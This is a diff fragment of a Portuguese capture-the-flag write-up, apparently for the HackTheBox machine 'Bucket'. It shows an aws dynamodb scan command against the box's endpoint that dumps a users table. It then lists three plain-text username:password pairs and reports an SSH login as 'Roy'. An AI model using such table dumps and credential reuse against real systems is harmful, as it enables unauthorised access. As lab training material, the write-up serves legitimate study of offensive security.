@@ -99,4 +99,17 @@ Vamos ver se conseguimos credenciais;
 aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb/
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
+Temos credenciais :D
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Mgmt:Management@#1@#
+Cloudadm:Welcome123!
+Sysadm:n2vM-<_K_Q:.Aa2
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+
+
+
+Após testa-las, conseguimos realizar login via SSH com o usuário 'Roy'
+![Image](https://i.imgur.com/0q73Xnv.png)
 
